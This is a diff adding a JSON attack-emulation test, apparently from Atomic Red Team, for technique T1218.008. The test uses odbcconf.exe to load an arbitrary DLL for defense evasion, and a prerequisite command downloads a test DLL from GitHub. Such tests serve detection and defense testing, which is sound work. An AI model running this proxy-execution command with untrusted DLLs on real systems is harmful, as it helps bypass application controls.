@@ -1,0 +1,36 @@
+{
+    "name": "Odbcconf.exe - Execute Arbitrary DLL",
+    "description": "Execute arbitrary DLL file stored locally. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1218.008",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Odbcconf",
+    "source": "ART",
+    "uuid": "2430498b-06c0-4b92-a448-8ad263c388e2",
+    "arguments": {
+        "dll_payload": {
+            "description": "DLL to execute",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n",
+            "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
